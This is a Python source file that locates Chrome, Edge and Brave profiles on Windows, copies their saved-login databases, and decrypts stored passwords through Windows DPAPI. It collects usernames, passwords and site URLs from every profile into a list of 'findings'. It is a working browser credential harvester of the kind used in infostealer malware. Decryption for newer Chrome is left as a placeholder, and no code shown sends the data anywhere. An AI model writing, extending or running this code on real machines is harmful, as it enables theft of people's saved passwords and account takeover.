import os
import sqlite3
import shutil
import json
import base64
import tempfile
from datetime import datetime
try:
    import win32crypt
except ImportError:
    win32crypt = None

def find_chrome_profiles() -> list:
    """Return a list of Chrome profile paths for this OS."""
    profiles = []
    local_app_data = os.environ.get('LOCALAPPDATA')
    if not local_app_data:
        return []
        
    # Common chromium paths on Windows
    browser_paths = [
        os.path.join(local_app_data, r"Google\Chrome\User Data"),
        os.path.join(local_app_data, r"Microsoft\Edge\User Data"),
        os.path.join(local_app_data, r"BraveSoftware\Brave-Browser\User Data"),
    ]
    
    for user_data_dir in browser_paths:
        if not os.path.exists(user_data_dir):
            continue
            
        # Check Default and Profile * folders
        potential_profiles = ["Default"] + [d for d in os.listdir(user_data_dir) if d.startswith("Profile ")]
        
        for profile in potential_profiles:
            profile_path = os.path.join(user_data_dir, profile)
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                profiles.append({
                    "path": profile_path,
                    "browser": "Chrome" if "Google" in user_data_dir else ("Edge" if "Microsoft" in user_data_dir else "Brave"),
                    "profile_name": profile
                })
                
    return profiles

def decrypt_password(encrypted_value: bytes) -> str:
    """Decrypt Chrome password using DPAPI."""
    if not win32crypt:
        return "[DPAPI MISSING]"
        
    try:
        # Chrome < 80 used DPAPI directly. Chrome >= 80 uses AES-GCM with a key encrypted by DPAPI.
        # For this starter implementation, we'll assume the simpler DPAPI or try to handle the v80+ key if possible.
        # However, v80+ key extraction is complex (requires reading Local State). 
        # For simplicity in this 'starter' version, we will implement the direct DPAPI fallback 
        # but note that modern Chrome requires the Local State key.
        
        # Let's try direct DPAPI first (works for older versions or some variants)
        # If it starts with v10 or v11, it might be AES.
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
             return "[ENCRYPTED_AES_GCM_TODO]" # Placeholder for full v80+ implementation
             
        _, decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
        return decrypted.decode('utf-8')
    except Exception:
        return "[DECRYPTION_FAILED]"

def extract_chrome_passwords(profile_path: str) -> list:
    """Return list of dicts with username, password (decrypted), domain, metadata."""
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return []
        
    # Copy to temp to avoid locking
    temp_dir = tempfile.mkdtemp()
    temp_db = os.path.join(temp_dir, "Login Data")
    shutil.copy2(login_db, temp_db)
    
    findings = []
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        
        for row in cursor.fetchall():
            origin_url, username, encrypted_password, date_created = row
            
            if not username or not encrypted_password:
                continue
                
            password = decrypt_password(encrypted_password)
            
            findings.append({
                "username": username,
                "password": password,
                "domain": origin_url,
                "metadata": {
                    "origin": origin_url,
                    "created": date_created
                }
            })
            
    except Exception as e:
        print(f"Error reading chrome DB {profile_path}: {e}")
    finally:
        if conn:
            conn.close()
        shutil.rmtree(temp_dir, ignore_errors=True)
        
    return findings

def run_browser_collectors() -> list:
    """Collects credentials from all installed browsers."""
    all_findings = []
    profiles = find_chrome_profiles()
    
    for profile in profiles:
        creds = extract_chrome_passwords(profile["path"])
        for cred in creds:
            # Convert to raw finding format
            all_findings.append({
                "source_type": "browser_password",
                "location": {
                    "browser": profile["browser"],
                    "profile": profile["profile_name"],
                    "path": profile["path"]
                },
                "secret_value": cred["password"],
                "username": cred["username"],
                "domain": cred["domain"],
                "metadata": cred["metadata"]
            })
            
    return all_findings
